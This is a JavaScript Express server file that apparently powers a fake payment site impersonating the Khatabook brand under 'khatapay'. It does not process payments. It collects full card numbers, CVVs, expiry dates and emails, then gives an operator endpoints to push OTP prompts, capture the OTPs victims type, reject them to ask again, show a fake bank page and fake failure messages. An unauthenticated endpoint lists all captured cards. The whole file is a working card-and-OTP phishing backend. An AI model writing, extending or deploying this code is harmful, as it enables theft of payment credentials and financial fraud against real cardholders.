import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';
import { Server } from 'socket.io';
import path from 'path';
import fs from 'fs';

// Generate a unique ID for this server instance
const SERVER_ID = crypto.randomBytes(3).toString('hex');

// Initialize Express app
const app = express();

// Middleware setup with better error handling
app.use(bodyParser.json({
  limit: '1mb',
  verify: (req, res, buf) => {
    try {
      JSON.parse(buf);
    } catch(e) {
      res.status(400).send('Invalid JSON');
      throw Error('Invalid JSON');
    }
  }
}));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST']
}));

// Add subdomain handling middleware
app.use((req, res, next) => {
  const host = req.headers.host;
  
  // Detect if we're on a subdomain
  if (host && host.startsWith('pay.')) {
    // Extract pid from request query
    const pid = req.query.pid;
    
    if (pid) {
      // Forward to landing.html with the pid parameter
      req.url = `/landing.html?pid=${pid}`;
    } else {
      // If no pid, redirect to main domain
      return res.redirect(`https://www.khatabook.com`);
    }
  }
  
  next();
});

// Clean URL middleware for regular pages
app.use((req, res, next) => {
  // Handle clean URLs for our main pages
  const cleanUrls = ['payment', 'success', 'fail', 'landing', 'bankpage', 'admin'];
  for (const page of cleanUrls) {
    if (req.path === `/${page}`) {
      return res.sendFile(path.join(process.cwd(), `${page}.html`));
    }
  }
  next();
});

// Serve static files
app.use(express.static("."));

// Redirect direct visitors to khatabook.com
app.get('/', (req, res, next) => {
  // Only redirect if it's a direct visit without any query parameters
  if (!Object.keys(req.query).length) {
    return res.redirect('https://www.khatabook.com');
  }
  next();
});

// Global error handler middleware
app.use((err, req, res, next) => {
  console.error('Express error:', err);
  if (res.headersSent) {
    return next(err);
  }
  res.status(500).json({ status: 'error', message: 'Internal server error' });
});

const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

const io = new Server(server);
const transactions = new Map();
const paymentLinks = new Map();

// Modified Payment Links Endpoint with robust error handling
app.post('/api/generatePaymentLink', (req, res) => {
  try {
    // Validate input
    if (!req.body) {
      return res.status(400).json({ status: "error", message: "Invalid request body" });
    }
    
    const { amount, description } = req.body;

    if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
      return res.status(400).json({ status: "error", message: "Invalid amount" });
    }

    if (!description || typeof description !== 'string' || !description.trim()) {
      return res.status(400).json({ status: "error", message: "Description required" });
    }

    // Generate unique invoice ID
    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    
    // Get protocol and host information safely
    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
    let host = req.get('host') || 'khatapay.me';
    
    // If host already has www. prefix, remove it
    host = host.replace(/^www\./, '');
    
    // Remove port if present
    const baseDomain = host.split(':')[0]; 
    
    // Create payment link with pay. subdomain
    const paymentLink = `${protocol}://pay.${baseDomain}?pid=${invoiceId}`;

    // Store payment link data
    paymentLinks.set(invoiceId, {
      amount: parseFloat(amount),
      description: description.trim(),
      paymentLink,
      createdAt: new Date().toISOString()
    });

    console.log(`Generated payment link: ${paymentLink} for amount: ${amount}, invoice: ${invoiceId}`);

    // Send success response
    return res.json({ 
      status: "success", 
      paymentLink,
      invoiceId
    });
    
  } catch (error) {
    console.error('Payment Link Error:', error);
    
    // Send error response with safe error message
    return res.status(500).json({ 
      status: "error", 
      message: "Failed to generate payment link. Please try again." 
    });
  }
});

// Get payment details endpoint
app.get('/api/getPaymentDetails', (req, res) => {
  try {
    const { pid } = req.query;
    if (!pid) {
      return res.status(400).json({ status: "error", message: "Missing payment ID" });
    }
    
    if (!paymentLinks.has(pid)) {
      return res.status(404).json({ status: "error", message: "Payment not found" });
    }
    
    return res.json({ status: "success", payment: paymentLinks.get(pid) });
  } catch (error) {
    console.error('Get Payment Details Error:', error);
    return res.status(500).json({ status: "error", message: "Failed to get payment details" });
  }
});

// Transaction Endpoints
app.post('/api/sendPaymentDetails', (req, res) => {
  try {
    const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;

    // Input validation
    if (!cardNumber || !expiry || !cvv || !email || !amount || !cardholder) {
      return res.status(400).json({ status: "error", message: "Missing fields" });
    }

    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();

    const transaction = {
      id: invoiceId,
      cardNumber,
      expiry,
      cvv,
      email,
      amount: amount.toString().replace(/,/g, ''),
      currency: currency || 'INR',
      cardholder,
      status: 'processing',
      otpShown: false,
      otpEntered: null,
      otpError: false,
      redirectStatus: null,
      bankpageVisible: false,
      timestamp: new Date().toLocaleString()
    };

    transactions.set(invoiceId, transaction);
    io.emit('new_transaction');
    return res.json({ status: "success", invoiceId });
  } catch (error) {
    console.error('Transaction Error:', error);
    return res.status(500).json({ status: "error", message: "Payment processing failed" });
  }
});

// Get transactions list
app.get('/api/transactions', (req, res) => {
  try {
    return res.json(Array.from(transactions.values()));
  } catch (error) {
    console.error('Get Transactions Error:', error);
    return res.status(500).json({ status: "error", message: "Failed to get transactions" });
  }
});

// Show OTP form
app.post('/api/showOTP', (req, res) => {
  try {
    const { invoiceId } = req.body;
    if (!invoiceId) {
      return res.status(400).json({ status: "error", message: "Invoice ID required" });
    }
    
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ status: "error", message: "Transaction not found" });
    }

    txn.otpShown = true;
    txn.status = 'otp_pending';
    txn.otpError = false;
    io.to(invoiceId).emit('show_otp');
    return res.json({ status: "success", message: "OTP form shown" });
  } catch (error) {
    console.error('Show OTP Error:', error);
    return res.status(500).json({ status: "error", message: "Failed to show OTP form" });
  }
});

// Mark OTP as wrong
app.post('/api/wrongOTP', (req, res) => {
  try {
    const { invoiceId } = req.body;
    if (!invoiceId) {
      return res.status(400).json({ status: "error", message: "Invoice ID required" });
    }
    
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ status: "error", message: "Transaction not found" });
    }

    txn.otpError = true;
    txn.status = 'otp_pending';
    return res.json({ status: "success", message: "OTP marked wrong" });
  } catch (error) {
    console.error('Wrong OTP Error:', error);
    return res.status(500).json({ status: "error", message: "Failed to mark OTP as wrong" });
  }
});

// Check transaction status
app.get('/api/checkTransactionStatus', (req, res) => {
  try {
    const { invoiceId } = req.query;
    if (!invoiceId) {
      return res.status(400).json({ status: "error", message: "Invoice ID required" });
    }
    
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ status: "error", message: "Transaction not found" });
    }

    if (txn.status === 'otp_pending' && txn.otpShown) {
      return res.json({
        status: "show_otp",
        message: "Show OTP form",
        otpError: txn.otpError
      });
    }

    if (txn.redirectStatus) {
      const redirectUrls = {
        success: `/success?invoiceId=${invoiceId}`,
        fail: `/fail?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
        bankpage: `/bankpage?invoiceId=${invoiceId}`
      };
      return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
    }

    return res.json({ status: txn.status, otpError: txn.otpError });
  } catch (error) {
    console.error('Check Transaction Status Error:', error);
    return res.status(500).json({ status: "error", message: "Failed to check transaction status" });
  }
});

// Submit OTP
app.post('/api/submitOTP', (req, res) => {
  try {
    const { invoiceId, otp } = req.body;
    if (!invoiceId || !otp) {
      return res.status(400).json({ status: "error", message: "Invoice ID and OTP required" });
    }
    
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ status: "error", message: "Transaction not found" });
    }

    txn.otpEntered = otp;
    txn.status = 'otp_received';
    txn.otpError = false;
    return res.json({ status: "success", message: "OTP received" });
  } catch (error) {
    console.error('Submit OTP Error:', error);
    return res.status(500).json({ status: "error", message: "Failed to submit OTP" });
  }
});

// Update redirect status
app.post('/api/updateRedirectStatus', (req, res) => {
  try {
    const { invoiceId, redirectStatus, failureReason } = req.body;
    if (!invoiceId || !redirectStatus) {
      return res.status(400).json({ status: "error", message: "Invoice ID and redirect status required" });
    }
    
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ status: "error", message: "Transaction not found" });
    }

    txn.redirectStatus = redirectStatus;
    if (failureReason) {
      txn.failureReason = failureReason;
    }

    const redirectUrls = {
      success: `/success?invoiceId=${invoiceId}`,
      fail: `/fail?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
    };

    return res.json({
      status: "success",
      invoiceId,
      redirectStatus,
      redirectUrl: redirectUrls[redirectStatus] || `/bankpage?invoiceId=${invoiceId}`
    });
  } catch (error) {
    console.error('Update Redirect Status Error:', error);
    return res.status(500).json({ status: "error", message: "Failed to update redirect status" });
  }
});

// Show bank page
app.post('/api/showBankpage', (req, res) => {
  try {
    const { invoiceId } = req.body;
    if (!invoiceId) {
      return res.status(400).json({ status: "error", message: "Invoice ID required" });
    }
    
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ status: "error", message: "Transaction not found" });
    }

    txn.redirectStatus = 'bankpage';
    txn.bankpageVisible = true;
    return res.json({ status: 'success' });
  } catch (error) {
    console.error('Show Bankpage Error:', error);
    return res.status(500).json({ status: "error", message: "Failed to show bank page" });
  }
});

// Hide bank page
app.post('/api/hideBankpage', (req, res) => {
  try {
    const { invoiceId } = req.body;
    if (!invoiceId) {
      return res.status(400).json({ status: "error", message: "Invoice ID required" });
    }
    
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ status: "error", message: "Transaction not found" });
    }

    txn.redirectStatus = null;
    txn.bankpageVisible = false;
    io.to(invoiceId).emit('hide_bankpage', { invoiceId });
    return res.json({ status: 'success' });
  } catch (error) {
    console.error('Hide Bankpage Error:', error);
    return res.status(500).json({ status: "error", message: "Failed to hide bank page" });
  }
});

// Get transaction for success page
app.get('/api/getTransactionForSuccess', (req, res) => {
  try {
    const { invoiceId } = req.query;
    if (!invoiceId) {
      return res.status(400).json({ status: "error", message: "Invoice ID required" });
    }
    
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ status: "error", message: "Transaction not found" });
    }

    return res.json({
      status: "success",
      data: {
        amount: txn.amount,
        invoiceId: txn.id,
        timestamp: txn.timestamp,
        email: txn.email
      }
    });
  } catch (error) {
    console.error('Get Transaction For Success Error:', error);
    return res.status(500).json({ status: "error", message: "Failed to get transaction details" });
  }
});

// Get transaction for fail page
app.get('/api/getTransactionForFail', (req, res) => {
  try {
    const { invoiceId, reason } = req.query;
    if (!invoiceId) {
      return res.status(400).json({ status: "error", message: "Invoice ID required" });
    }
    
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ status: "error", message: "Transaction not found" });
    }

    // Map reason codes to human-readable messages
    const reasonMessages = {
      'insufficient_balance': 'Insufficient balance in your account',
      'bank_declined': 'Transaction declined by bank',
      'card_disabled': 'Online payments are disabled on your card',
      'invalid_card': 'Invalid card number or details',
      'canceled': 'Transaction canceled by user'
    };

    return res.json({
      status: "failed",
      data: {
        amount: txn.amount,
        invoiceId: txn.id,
        timestamp: txn.timestamp,
        email: txn.email,
        reason: reasonMessages[reason] || reasonMessages[txn.failureReason] || 'Transaction failed'
      }
    });
  } catch (error) {
    console.error('Get Transaction For Fail Error:', error);
    return res.status(500).json({ status: "error", message: "Failed to get transaction details" });
  }
});

// Socket.io connection handler
io.on('connection', (socket) => {
  socket.on('join', (invoiceId) => {
    if (invoiceId) {
      socket.join(invoiceId);
      console.log(`Client joined room: ${invoiceId}`);
    }
  });
  
  socket.on('disconnect', () => {
    console.log('Client disconnected');
  });
});
